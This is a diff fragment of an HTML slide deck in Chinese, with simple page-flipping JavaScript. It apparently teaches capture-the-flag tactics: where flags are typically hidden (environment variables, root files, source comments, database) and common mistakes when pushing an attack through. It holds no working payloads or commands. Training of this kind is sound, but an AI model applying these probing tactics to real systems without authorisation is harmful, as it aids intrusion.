+flag 藏点优先级：<span class="highlight">环境变量 &gt; 根目录文件 &gt; 源码注释 &gt; 数据库</span>。`,
+
+            6: `三个血泪坑：payload 当参数名、POST 405 误判、一步到位失败就放弃。
+
+打不进不是漏洞不存在，是<span class="highlight-pink">没找对断点</span>。`
+        };
+
+        function showTextImmediate(pageNum) {
+            const textId = 'text' + pageNum;
+            const textEl = document.getElementById(textId);
+            if (textEl && texts[pageNum]) {
+                textEl.innerHTML = texts[pageNum];
+            }
+        }
+
+        function showPage(pageNum) {
+            pages.forEach((page, index) => {
+                page.classList.remove('active', 'flipped');
+                if (index < pageNum) {
+                    page.classList.add('flipped');
+                } else if (index === pageNum) {
+                    page.classList.add('active');
+                    showTextImmediate(pageNum);
+                }
+            });
+            currentPage = pageNum;
+        }
+
+        function nextPage() {
+            if (currentPage < totalPages - 1) {
+                showPage(currentPage + 1);
+            }
+        }
+
+        function prevPage() {
+            if (currentPage > 0) {
+                showPage(currentPage - 1);
+            }
+        }
+
+        document.querySelector('.page.cover').addEventListener('click', nextPage);
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'ArrowRight' || e.key === ' ') {
+                nextPage();
+            } else if (e.key === 'ArrowLeft') {
+                prevPage();
+            }
+        });
+
+        showPage(0);
+    </script>
+</body>
+</html>
